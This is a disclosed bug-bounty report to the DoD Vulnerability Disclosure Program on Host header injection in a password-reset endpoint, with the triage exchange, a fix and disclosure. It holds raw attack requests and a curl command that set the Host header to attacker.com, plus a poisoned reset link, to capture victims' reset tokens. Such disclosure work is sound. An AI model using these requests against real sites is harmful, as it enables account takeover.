title: Host Header Injection on https://███/████████/Account/ForgotPassword
vulnerability_information:
Dear DoD Team,

I found one high bug on your another domain. This is from Hack US Program. Affected domain is https://█████/

An attacker can manipulate the Host header as seen by the web application and cause the application to behave in unexpected ways.
Very often multiple websites are hosted on the same IP address. This is where the Host Header comes in. This header specifies which website should process the HTTP request. The web server uses the value of this header to dispatch the request to the specified website. Each website hosted on the same IP address is called a virtual host. And It's possible to send requests with arbitrary Host Headers to the first virtual host.

Here's the PoC btw:

███

Thank you DoD!

## Impact

Tampering of Host header can lead to the following attacks:
1) Web Cache Poisoning-Manipulating caching systems into storing a page generated with a malicious Host and serving it to others.
2) Password Reset Poisoning-Exploiting password reset emails and tricking them to deliver poisoned content directly to the target.
3) Cross Site Scripting - XSS can be performed, if the value of Host header is used for writing links without HTML-encoding. For example Joomla used to write Host header to every page without HTML Encoding like this: <link href=”http://_SERVER['HOST']”> which led to cross site scripting.
4) Access to internal hosts-To access internal hosts.
5.) It can also lead to Phishing Attacks.

## System Host(s)
███████

## Affected Product(s) and Version(s)
Users are affected

## CVE Numbers


## Steps to Reproduce
1. Go to this domain: https://███/████████/
2. Go to vendor login.
3. Create a test account.
4. Go to Forgot Password Reset: https://████/██████/Account/ForgotPassword
5. Before inserting your email. 
6. Turn your foxy proxy on.
7. Open your burp suite and go to http history tab.
8. Now insert your email.
9. In http history in burp you will see this request:

```javascript
POST /████████/Account/ForgotPassword HTTP/1.1
Host: ███
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=; TS014b77bb=; ASP.NET_SessionId=; TS0144f203=; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Csrf-Token: 
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://███████
Referer: https://████/█████████/Account/ForgotPassword
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

{"Email":"███████"}
```
10. Send this request to repeater tab.
11. Change Host headet to attacker.com
12. It shoud look like this:

```javascript
POST /████████/Account/ForgotPassword HTTP/1.1
Host: attacker.com
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=; TS014b77bb=; ASP.NET_SessionId=; TS0144f203=; CSRF-TOKEN=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Csrf-Token: 
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: https://████
Referer: https://███████/████/Account/ForgotPassword
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
```
13. Now send request and you will get 200 OK response.
14. Go to your mail/gmail.
15. You will see some magic.
16. PoC is down there.

## Suggested Mitigation/Remediation Actions

activities.message:
Greetings,
To validate your report, we require additional information.
Can you please answer the following questions?
Can you please provide proof of concept for further exploitation of the host header injection?
As of now, not really seeing any vulnerability besides the link being delivered to a potential victim, which would also require that website to have the resource being requested in the hyper link.
If you have any questions, please let me know.
Thanks again for supporting the DoD Vulnerability Disclosure Program.
Regards

Hey,

I will create a PoC but could you please wait until Saturday-Sunday? Just some personal stuff.

Since you want exploitation of host header injection. Malicious attacker is able to host his own server via 000webapphost or anything which is for hosting servers. And he could use his domain in header, so when he injects his domain in the header and when he wants to attack some user of your website hes gonna find his mail and use it for malicious activity, and that user will get malicious password reset link with attacker's domain. Obviously he's not gonna click it if domain is attacker.com, attacker would be smart and he would know how to manipulate his victim. And when victim click password reset and reset his password, attacker would get his password and other sensitive information.
Maybe I can get SSRF on this domain. I will try that when I come back home for some few days. But I don't really see if anything is confusing?

Use $_SERVER['SERVER_NAME'] rather than $_SERVER['HTTP_HOST']
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";

Here's the impact again:

**Impact**
The victim will receive the malicious link in their email, and, when clicked, will leak the user’s password reset link / token to the attacker, leading to full account takeover. Attacker could gain sensitive information when he do account takeover.

I think there's high chance for SSRF via flawed request parsing or Routing based SSRF, I can't do anything now until Saturday-Sunday like I said personal stuff. 

Thank you!

Also, check these two good HackerOne's reports about host header injection bug, if you think it's not a "vulnerability", when it is.

https://hackerone.com/reports/226659
https://hackerone.com/reports/167631

Thank you! Have a good day.

When I comeback home, I will try SSRF, cache poisoning and XSS, maybe I can make this severity critical. Now think are you gonna triage this report, since host header injection is valuable bug when it comes for reset password, and this report is about host header injection on reset password page.

Thank you!

Greetings,

The reports that were referenced slightly differ in the fact that in those exploits you would be able to manipulate the requested resource to be included in the link that would be delivered to the victim. If you are able to exploit further, possibly SSRF or phishing from registering the domain that is reflected in the email and standing up a malicious website for full account take over then we would gladly take the vulnerability. I am going to place the report into needs more info until the proof of concept for the exploitation is provided. 

Thank you, have a nice day!

Hey,

Then wait until Saturday-Sunday. I will make a PoC. Although if you want to test it host your own server. Make sure to know that host header injection is bug.

Thank you!

Also I forgot to mention that severity of this vulnerability is high since it's on reset password page. If it was on normal page then it would be medium.

Thank you!

Hey, this is what I recorded with my mobile. Since I won't be on my pc for some few days, like I said before. I think you can understand how is this working. When victim press this link it will redirect him to attacker's website and then attacker would have victim's password reset link and he could reset his password and do ATO (Account Takeover) and get sensitive information of victim. So please take this vulnerability as a serious vulnerability!

Thank you!

Greetings,

The video that was provided shows people dancing, did you mean to send that video?
Ah man, sorry my mistake, this day went from good to bad one, whatever I sent it's my mistake, let me find right video that I recorded.
Please delete whatever I sent, this is funny mistake. Now for real I will send you PoC that I recorded on my phone.

This might take some time maybe until tomorrow, internet is so slow.

Thank you!

Hey, there's no way I can send my PoC on phone that I recorded due to bad internet. I clicked this password reset link that I got today when I discovered host header injection bug. And it redirected me to attacker's domain.

1. Click my password reset link:

https://attacker.com//█████/Account/ResetPassword?t=CfDJ8LnpFPwgh5FMpOb1F%2FCnxefoFCtP%2F0HrFpb7jdskSoUSujStlkgpGak5azwqOoBWm1DVWcQe3lrKczz%2B9tv568jSdFcc9DvArkFHWM1VKfWe37UhUKQrcpvvxAhtP73gcw%3D%3D

2. You will get redirected to attacker's domain.

This is how attacker would get victim's password reset link so he could do Account Takeover just by hosting his server and get other sensitive information. But however I will try to find SSRF, XSS and cache poisoning via this bug. At Saturday and Sunday by the way! If this is not enough then wait Saturday-Sunday and I will create a video PoC.

Thank you!

Also, may I ask why changing severity to medium? This should be high severity.

Thank you!

Tomorrow I will make a PoC, I will keep you updated!

Hey @marmelade321,

I made video PoC about this host header injection. Make sure to watch until it ends.

If I can escalate it to the SSRF, XSS and cache poisoning via host header injection, I will make more reports.

Also, change title to **Host Header Injection on https://█████/███/Account/ForgotPassword leading to ATOs and sensitive information.**


Thank you!

Also you can reproduce this under 1 minutes using curl command: 

```javascript
curl -i -s -k -X $'POST' \                                                                                       ─╯
    -H $'Host: attacker.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/json' -H $'X-Csrf-Token: █████████' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 35' -H $'Origin: https://████' -H $'Referer: https://██████/█████/Account/ForgotPassword' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' -H $'Te: trailers' -H $'Connection: close' \
    -b $'.AspNetCore.Antiforgery.wZhPOrJ1UhI=CfDJ8ExMlokhly1Dq_QElov3x7_pqLqLpBgCpKphKQBh-j5VPNJ0x--jmZKMB_-TMzYIUZXcFjziGdhv5xuEpGdfqqJy737kItPYp_OHSX7cw72Vz2dgBPVD3_DJQB4cj17nEloUR1M_0cIaMSd_Tij7a_A; TS014b77bb=01d263603ae063332a699e29de98e332fbc03c5878405db80436e6874750b7035c021b15a6b8f58f750d46ce6a8fac40eeb746973b5d97f0296d6bc8ff46fb22033db5083f743c110a5fb7739f53a55f270bfcb263e039e745e09f30a7a45c66860d1d2204f843cf7670de0dc1a60c60bf139b7171; ASP.NET_SessionId=<your session id>; CSRF-TOKEN=<you csrf token>' \
    --data-binary $'{\"Email\":\"yourmail@gmail.com\"}' \
    $'https://██████████/████/Account/ForgotPassword'
```
And you will get this response:

```javascript
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Type: application/json
Content-Security-Policy: child-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Frame-Options: SAMEORIGIN
Access-Control-Allow-Origin: https://████████
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Methods: GET,POST,OPTIONS
Access-Control-Allow-Credentials: true
Date: Sun, 28 Aug 2022 14:58:22 GMT
Connection: close
Transfer-Encoding: chunked

{}%
```

I tested on one more account and I can confirm Host Header Injection bug.

████████

And change severity to high. 

Thank you!

Greetings,

We have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.

Thank you for bringing this vulnerability to our attention!

We will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.

You will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.

Thanks again for supporting the DoD Vulnerability Disclosure Program.

Regards,

The VDP Team

Hey,

Thank you! I'd appreciate it a lot. If you want to play with this vulnerability, host your own server or use ngrok. Also can you change severity to high? Since this bug is almost critical.

Thank you!
Sure, I am down to answer questions, if y'all need any help, make sure to contact me!

Greetings,

We will not be changing the severity to high, using the CVSS calculator we were only able to vaildate the vulnerability to be a medium, a big component in that score is the fact that the success of exploiting this vulnerability relies heavily on user interaction.

I have one question? Since this vulnerable domain is from Hack US program. And Hack US program is bug bounty program, am I gonna get any bounty? 

Thank you!
Unfortunately not, we only give out bounties when there is an active Hack US program.

Okay.

Thank you!

I see, you were using CVSS calculator and I can understand this. But what about comparing with other reports? Every report about host header injection on forgot password reset page is high. Also could you please delete that video "of people dancing" this is silly mistake for me. 

Thank you!
Also do you provide any swags? Or I need to be #1 VDP researcher of the month?

Hey,

Take a look at this same DoD report: https://hackerone.com/reports/1108874
As you can see severity is critical. And severity of my report is medium.

Thank you!

████

Now there's no password reset link anymore. I see your team still didn't validate host header. 

Thank you!
Can we disclose this report? But make sure to delete or mark that video that I sent accidentally. Or you want to keep it undisclosed?

@0x1int sure we can do a disclosure and redact or remove artifacts in the report. You should be able to request disclosure from the dropdown in the report that allows you to post a comment. I think one of the selections is "request disclosure". It might take a week or two for us to disclosure, we have a little bit of a backlog for disclosure requests.
Also, needs to be remediated before we disclose but yes, we can do that disclosure after resolution.

Hey, 

Yes I would like to disclose this report. Also make sure to remove this video or mark it so no one will be able to see it:

███

Thank you!

Hey,

Sorry If I'm annoying you. But make sure to know that title should be host header injection / cache poisoning. Since I poisoned password reset links. Change title if you want. 

Thank you! Have a good day.

Greetings @marmelade321 @ag3nt-j1 

 Is everything fixed? 

Thank you!

Good news!

The vulnerability you reported has been resolved and this report is now closed. If you have any further questions or disagree that the report is resolved, please let us know.

Thank you for your time and effort to improve the security of the DoD information network.

Regards,

The VDP Team

Greetings @agent-p1 

Can we disclose?

Thanks for participating in the DoD Vulnerability Disclosure Program. We're publicly disclosing your resolved report at this time. We also lock the report on the disclosure but feel free to reach out to us at dc3.vdpquestions@us.af.mil if there are any questions, concerns or issues.
